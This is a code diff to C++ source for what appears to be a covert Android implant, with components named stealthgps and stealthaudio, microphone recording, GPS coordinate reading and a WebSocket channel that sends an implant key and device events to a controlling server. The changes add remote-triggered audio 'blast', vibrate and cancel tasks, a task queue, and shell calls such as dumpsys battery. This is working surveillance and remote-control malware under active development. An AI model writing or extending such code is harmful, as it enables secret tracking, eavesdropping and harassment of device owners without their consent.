@@ -131,6 +131,18 @@ static std::atomic<bool>                 g_mic_file_ready{false};
 static std::mutex                        g_mic_file_mutex;
 static std::condition_variable           g_mic_file_cv;
 
+// Audio task queue (for tracking pending audio tasks)
+struct AudioTask {
+    long taskId;
+    int type;
+    float volume;
+    int loops;
+    std::string status;  // "pending", "playing", "completed", "cancelled"
+};
+static std::queue<AudioTask>             g_audio_task_queue;
+static std::mutex                        g_audio_queue_mutex;
+static const int                         MAX_AUDIO_QUEUE_SIZE = 50;
+
 static std::atomic<int>     g_ping_interval{60};
 static std::atomic<int>     g_last_battery_level{-1};
 static std::atomic<int>     g_last_loc_state{-1};
@@ -640,15 +652,17 @@ static const char* choose_location_file_path() {
 
 static const char* choose_gps_coords_path() {
     static const char* candidates[] = {
-        GPS_COORDS_FILE,
-        "/data/user_de/0/com.stealthgps/files/coords.txt",
-        "/data/system_de/0/com.stealthgps/files/coords.txt",
+        "/data/local/tmp/com.stealthgps_coords.txt",
+        "/data/local/tmp/coords.txt",
         GPS_COORDS_FALLBACK,
     };
     for (const char* p : candidates) {
         if (access(p, R_OK) == 0) return p;
     }
-    return GPS_COORDS_FILE;
+    // If none of the candidate paths are readable, prefer a world-readable fallback
+    // under /data/local/tmp rather than returning an app-private path which will
+    // cause repeated "Cannot open coords file" errors in logs.
+    return GPS_COORDS_FALLBACK;
 }
 
 static void write_flag_file(const char* path, int status) {
@@ -661,24 +675,36 @@ static void write_flag_file(const char* path, int status) {
 }
 
 bool is_location_enabled() {
-    const char* path = choose_location_file_path();
-    int fd = open(path, O_RDONLY);
+    // Prefer a clearly shared flag file under /data/local/tmp so users can toggle
+    // location without touching app-private storage. Do NOT auto-create app-private
+    // files here; if no flag exists, default to enabled (backwards compatible).
+    int fd = open(LOC_FLAG_FILE, O_RDONLY);
     if (fd >= 0) {
         char ch = '1';
         bool ok = (read(fd, &ch, 1) == 1);
         close(fd);
         if (ok) return ch == '1';
-        return true; 
+        return true;
     }
-    
-    write_flag_file(path, 1);
-    write_flag_file(LOC_FLAG_FILE, 1);
+
+    const char* path = choose_location_file_path();
+    if (path && strcmp(path, LOC_FLAG_FILE) != 0) {
+        fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            char ch = '1';
+            bool ok = (read(fd, &ch, 1) == 1);
+            close(fd);
+            if (ok) return ch == '1';
+            return true;
+        }
+    }
+
+    // No explicit flag found; default to enabled but DO NOT create files.
     return true;
 }
 
 static void set_location_file(int status) {
-    const char* path = choose_location_file_path();
-    write_flag_file(path, status);
+    // Only update the shared flag file; do not write to app-private paths.
     write_flag_file(LOC_FLAG_FILE, status);
 }
 
@@ -737,8 +763,27 @@ int get_charging_state() {
     char buf[32]; ssize_t n = read(fd, buf, sizeof(buf)-1); close(fd);
     if (n <= 0) return (g_cached_charging_state >= 0) ? g_cached_charging_state : 0;
     buf[n] = '\0';
+    // Log raw status for debugging and parse it.
+    std::string raw_status(buf);
+    log_message(std::string("battery status raw: ") + raw_status);
     g_cached_charging_state = parse_battery_status(buf);
+    // If sysfs says not charging but system reports USB/AC powered, prefer dumpsys.
+    if (g_cached_charging_state == 0) {
+        auto ds = exec_cmd_shell(std::string("dumpsys battery"));
+        if (ds.first) {
+            const std::string& out = ds.second;
+            log_message(std::string("dumpsys battery: ") + out);
+            if (out.find("USB powered: true") != std::string::npos ||
+                out.find("AC powered: true")  != std::string::npos) {
+                log_message("Overriding charging state to 1 based on dumpsys");
+                g_cached_charging_state = 1;
+            }
+        } else {
+            log_message("Failed to run dumpsys battery for charging fallback");
+        }
+    }
     g_cached_charging_time  = now;
+    log_message(std::string("parsed charging state: ") + (g_cached_charging_state ? "1" : "0"));
     return g_cached_charging_state;
 }
 
@@ -1057,6 +1102,7 @@ static void trim_string(std::string& s) {
 static std::string normalize_audio_play_value(const std::string& json) {
     std::string play = get_json_val(json, "play");
     if (play.empty()) play = get_json_val(json, "play_audio");
+    if (play.empty()) play = get_json_val(json, "type");
     trim_string(play);
     if (play.empty()) return "";
     try { return std::to_string(std::stoi(play)); } catch (...) { return play; }
@@ -1071,6 +1117,7 @@ static void handle_ipc_message(const std::string& json) {
     
     static const std::unordered_set<std::string> ALLOWED = {
         "audio_started", "audio_done",
+        "audio_task_queued", "audio_task_started", "audio_task_completed", "audio_task_failed", "audio_task_cancelled",
         "mic_record_started", "mic_record_done",
         "alert_shown", "alert_dismissed"
     };
@@ -1088,12 +1135,25 @@ static void handle_ipc_message(const std::string& json) {
 
     
     std::string fwd;
-    fwd.reserve(256);
+    fwd.reserve(512);
     fwd += "{\"implant_key\":\""; fwd += g_escaped_implant_key;
     fwd += "\",\"device_id\":\"";  fwd += g_escaped_device_id;
     fwd += "\",\"event\":\"";      append_json_escaped(fwd, event); fwd += "\"";
     const std::string pa = get_json_val(json, "play_audio");
     if (!pa.empty()) { fwd += ",\"play_audio\":"; fwd += pa; }
+    
+    // Forward task queue fields
+    const std::string task_id = get_json_val(json, "task_id");
+    if (!task_id.empty()) { fwd += ",\"task_id\":"; fwd += task_id; }
+    const std::string type = get_json_val(json, "type");
+    if (!type.empty()) { fwd += ",\"type\":"; fwd += type; }
+    const std::string vol = get_json_val(json, "volume");
+    if (!vol.empty()) { fwd += ",\"volume\":"; fwd += vol; }
+    const std::string status = get_json_val(json, "status");
+    if (!status.empty()) { fwd += ",\"status\":\""; append_json_escaped(fwd, status); fwd += "\""; }
+    const std::string error = get_json_val(json, "error");
+    if (!error.empty()) { fwd += ",\"error\":\""; append_json_escaped(fwd, error); fwd += "\""; }
+    
     fwd += "}";
     
     if (!websocket_send_text(fwd)) {
@@ -1310,22 +1370,59 @@ void do_mic_record(int duration_s) {
 void do_audio_blast(const std::string& play, const std::string& loops, const std::string& volume) {
     log_message("audio_blast: play=" + play + " loops=" + loops + " volume=" + volume);
     if (play.empty()) return;
+    
     if (play == "1" || play == "2" || play == "3") {
+        // Generate unique task_id
+        long taskId = (long)std::time(nullptr) * 1000 + (int)(rand() % 1000);
+        
+        // Enqueue task (optional, mainly for tracking)
+        {
+            std::lock_guard<std::mutex> lock(g_audio_queue_mutex);
+            if (g_audio_task_queue.size() < MAX_AUDIO_QUEUE_SIZE) {
+                AudioTask task;
+                task.taskId = taskId;
+                task.type = std::stoi(play);
+                task.volume = std::stof(volume);
+                task.loops = std::stoi(loops);
+                task.status = "pending";
+                g_audio_task_queue.push(task);
+                log_message("Audio task " + std::to_string(taskId) + " enqueued (type=" + play + ")");
+            } else {
+                log_message("Audio queue full, rejecting task");
+                send_error_to_server("audio_blast", "Queue full");
+                return;
+            }
+        }
+        
+        // Broadcast with task_id
         if (!run_command_no_output({
                 "am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
                 "-f", "32", "--es", "action", "play", "--ei", "type", play,
                 "--es", "volume", volume, "--ei", "loops", loops,
+                "--el", "task_id", std::to_string(taskId),
                 "--es", "device_id", g_device_id })) {
             send_error_to_server("audio_blast", "Broadcast failed");
         }
         return;
     }
+    
     if (play == "0") {
+        // STOP command - can optionally pass task_id to cancel specific task
         run_command_no_output({"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
                                 "-f", "32", "--es", "action", "stop",
                                 "--es", "device_id", g_device_id});
+        
+        // Clear queue (optional)
+        {
+            std::lock_guard<std::mutex> lock(g_audio_queue_mutex);
+            while (!g_audio_task_queue.empty()) {
+                g_audio_task_queue.pop();
+            }
+            log_message("Audio queue cleared");
+        }
         return;
     }
+    
     send_error_to_server("audio_blast", "Invalid play value: " + play);
 }
 
@@ -1537,6 +1634,35 @@ void process_tasks() {
                 } else {
                     send_error_to_server("system_alert", "Invalid state: " + state);
                 }
+            });
+
+        } else if (task == "audio_play") {
+            std::string play = normalize_audio_play_value(payload);
+            std::string loops = get_json_val(payload, "loops"); trim_string(loops);
+            std::string volume = get_json_val(payload, "volume"); trim_string(volume);
+            if (play.empty()) play = "1";
+            if (loops.empty()) loops = "0";
+            if (volume.empty()) volume = "1.0";
+            try { loops = std::to_string(std::stoi(loops)); } catch (...) { loops = "0"; }
+            enqueue_task([play, loops, volume]() { do_audio_blast(play, loops, volume); });
+
+        } else if (task == "audio_clear_queue") {
+            enqueue_task([]() { do_audio_blast("0", "0", "1.0"); });
+
+        } else if (task == "audio_cancel") {
+            std::string task_id = get_json_val(payload, "task_id");
+            log_message("audio_cancel: task_id=" + task_id);
+            enqueue_task([]() { do_audio_blast("0", "0", "1.0"); });
+
+        } else if (task == "vibrate") {
+            std::string duration = get_json_val(payload, "duration"); trim_string(duration);
+            if (duration.empty()) duration = "1";
+            log_message("vibrate task: duration=" + duration);
+            enqueue_task([duration]() {
+                run_command_no_output({"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver",
+                                        "-f", "32", "--es", "action", "vibrate",
+                                        "--ei", "duration", duration,
+                                        "--es", "device_id", g_device_id});
             });
 
         } else if (task == "audio_blast") {
